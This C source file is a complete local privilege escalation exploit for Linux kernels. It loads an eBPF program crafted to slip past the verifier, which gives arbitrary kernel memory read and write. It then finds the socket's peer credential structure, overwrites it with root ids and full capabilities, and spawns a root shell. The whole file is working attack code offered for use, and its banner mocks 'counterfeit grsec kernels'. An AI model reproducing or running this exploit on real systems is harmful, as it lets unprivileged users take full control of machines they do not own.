#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/personality.h>

char buffer[64];
int sockets[2];
int mapfd, progfd;
int doredact = 0;

#define LOG_BUF_SIZE 65536
char bpf_log_buf[LOG_BUF_SIZE];

static __u64 ptr_to_u64(void *ptr)
{
	return (__u64) (unsigned long) ptr;
}

int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version)
{
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = ptr_to_u64((void *) insns),
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = ptr_to_u64((void *) license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries, int map_flags)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_update_elem(int fd, void *key, void *value, unsigned long long flags)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
		.flags = flags,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

#define BPF_ALU64_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_MOV64_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV32_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_MOV32_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = (__u32) (IMM) }),			\
	((struct bpf_insn) {					\
		.code  = 0, 					\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = ((__u64) (IMM)) >> 32 })

#ifndef BPF_PSEUDO_MAP_FD
# define BPF_PSEUDO_MAP_FD	1
#endif

#define BPF_LD_MAP_FD(DST, MAP_FD)				\
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_JMP_IMM(OP, DST, IMM, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
	((struct bpf_insn) {					\
		.code  = CODE,					\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_EXIT_INSN()						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_EXIT,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_DISABLE_VERIFIER()                                                       \
	BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF),             /* r2 = (u32)0xFFFFFFFF   */   \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2),   /* if (r2 == -1) {        */   \
	BPF_MOV64_IMM(BPF_REG_0, 0),                      /*   exit(0);             */   \
	BPF_EXIT_INSN()                                   /* }                      */   \

#define BPF_MAP_GET(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */              

static int load_prog() {
	struct bpf_insn prog[] = {
		BPF_DISABLE_VERIFIER(),

		BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, -16),   /* *(fp - 16) = r1       */

		BPF_LD_MAP_FD(BPF_REG_9, mapfd),

		BPF_MAP_GET(0, BPF_REG_6),                         /* r6 = op               */
		BPF_MAP_GET(1, BPF_REG_7),                         /* r7 = address          */
		BPF_MAP_GET(2, BPF_REG_8),                         /* r8 = value            */

		/* store map slot address in r2 */
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0               */
		BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */

		BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 2),             /* if (op == 0)          */
		/* get fp */
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0),
		BPF_EXIT_INSN(),

		BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 3),             /* else if (op == 1)     */
		/* get skbuff */
		BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_10, -16),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
		BPF_EXIT_INSN(),

		BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 2, 3),             /* else if (op == 2)     */
		/* read */
		BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),
		BPF_EXIT_INSN(),
		/* else                  */
		/* write */
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), 
		BPF_EXIT_INSN(),

	};
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog), "GPL", 0);
}

void info(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[.] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void msg(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void redact(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	if(doredact) {
		fprintf(stdout, "[!] ( ( R E D A C T E D ) )\n");
		return;
	}
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void fail(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[!] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

void 
initialize() {
	info("\n");
	info("t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)\n");
	info("\n");
	info("  ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **\n");
	info("\n");

	redact("creating bpf map\n");
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3, 0);
	if (mapfd < 0) {
		fail("failed to create bpf map: '%s'\n", strerror(errno));
	}

	redact("sneaking evil bpf past the verifier\n");
	progfd = load_prog();
	if (progfd < 0) {
		if (errno == EACCES) {
			msg("log:\n%s", bpf_log_buf);
		}
		fail("failed to load prog '%s'\n", strerror(errno));
	}

	redact("creating socketpair()\n");
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {
		fail("failed to create socket pair '%s'\n", strerror(errno));
	}

	redact("attaching bpf backdoor to socket\n");
	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0) {
		fail("setsockopt '%s'\n", strerror(errno));
	}
}

static void writemsg() {
	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer)) {
		fprintf(stderr, "short write: %d\n", n);
	}
}

static void 
update_elem(int key, unsigned long value) {
	if (bpf_update_elem(mapfd, &key, &value, 0)) {
		fail("bpf_update_elem failed '%s'\n", strerror(errno));
	}
}

static unsigned long 
get_value(int key) {
	unsigned long value;
	if (bpf_lookup_elem(mapfd, &key, &value)) {
		fail("bpf_lookup_elem failed '%s'\n", strerror(errno));
	}
	return value;
}

static unsigned long
sendcmd(unsigned long op, unsigned long addr, unsigned long value) {
	update_elem(0, op);
	update_elem(1, addr);
	update_elem(2, value);
	writemsg();
	return get_value(2);
}

unsigned long
get_skbuff() {
	return sendcmd(1, 0, 0);
}

unsigned long
get_fp() {
	return sendcmd(0, 0, 0);
}

unsigned long
read64(unsigned long addr) {
	return sendcmd(2, addr, 0);
}

void
write64(unsigned long addr, unsigned long val) {
	(void)sendcmd(3, addr, val);
}

static unsigned long find_sk_rcvtimeo() {
	unsigned long skbuff = get_skbuff();
	/*
	 * struct sk_buff {
	 *     [...24 byte offset...]
	 *     struct sock     *sk;
	 * };
	 *
	 */
	unsigned long addr = read64(skbuff + 24);
	msg("Leaking sock struct from %llx\n", addr);
	/*
	 * scan forward for expected sk_rcvtimeo value.
	 *
	 * struct sock {
	 *    [...]
	 *    long                    sk_rcvtimeo;             
	 *  };
	 */
	for (int i = 0; i < 100; i++, addr += 8) {
		if(read64(addr) == 0x7FFFFFFFFFFFFFFF) {
			if(read64(addr - 24) != 1000) {
				continue;
				
			}
			msg("found sock->sk_rcvtimeo at offset %d\n", i * 8);
			return addr;
		}
	}
	fail("failed to find sk_rcvtimeo.\n");
}

static unsigned long find_cred() {
	/*
	 * struct sock {
	 *    [...]
	 *    const struct cred       *sk_peer_cred;
	 *    long                    sk_rcvtimeo;             
	 *  };
	 */
	long result = read64(find_sk_rcvtimeo() - 8);
	msg("found sock->sk_peer_cred\n");
	return result;
}

static void
hammer_cred(unsigned long addr) {
	msg("hammering cred structure at %llx\n", addr);
#define w64(w) { write64(addr, (w)); addr += 8; }
	unsigned long val = read64(addr) & 0xFFFFFFFFUL;
	w64(val); 
	w64(0); w64(0); w64(0); w64(0);
	w64(0xFFFFFFFFFFFFFFFF); 
	w64(0xFFFFFFFFFFFFFFFF); 
	w64(0xFFFFFFFFFFFFFFFF); 
#undef w64
}

int
main(int argc, char **argv) {
	initialize();
	hammer_cred(find_cred());
	msg("credentials patched, launching shell...\n");
	if(execl("/bin/sh", "/bin/sh", NULL)) {
		fail("exec %s\n", strerror(errno));
	}
}
